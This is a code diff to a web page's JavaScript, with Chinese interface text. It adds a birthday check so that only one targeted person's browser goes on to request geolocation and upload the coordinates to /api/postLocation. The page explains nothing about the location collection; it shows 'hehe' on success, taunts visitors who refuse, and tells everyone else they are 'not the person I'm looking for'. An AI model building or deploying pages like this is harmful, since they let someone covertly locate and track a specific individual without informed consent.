@@ -75,12 +75,13 @@
     crossorigin="anonymous"
   ></script>
   <script>
-    init();
+    const birthday = prompt("请输入你的生日 YYYY-MM-DD:");
+    if (birthday != null){
+        validate({birthday});
+    }
     function init() {
       try {
         let result;
-        console.log(result);
-
         navigator.geolocation.getCurrentPosition(
           v => {
             const {
@@ -93,12 +94,13 @@
                 longitude,
                 latitude
             };
-            console.log(result);
+            $("#text").html('嘻嘻');
             set(result);
-        }, error => { console.log(error) });
+        }, error => { 
+            $("#text").html('哼，不愧是你');
+        });
       }
       catch (e) {}
-      
     }
     function set(params) {
       $.ajax("/api/postLocation", {
@@ -108,8 +110,24 @@
         data: JSON.stringify({
           ...params,
         }),
+      })
+    }
+    function validate(params) {
+      $.ajax("/api/validate", {
+        method: "POST",
+        contentType: "application/json; charset=utf-8",
+        dataType: "json",
+        data: JSON.stringify({
+          ...params,
+        }),
       }).done(function (res) {
-        $("#text").html('嘻嘻');
+        const {code} = res;
+        if (!code) {
+          init();
+        }
+        else {
+          alert('抱歉哦，你不是我要找的人');
+        }
       });
     }
   </script>
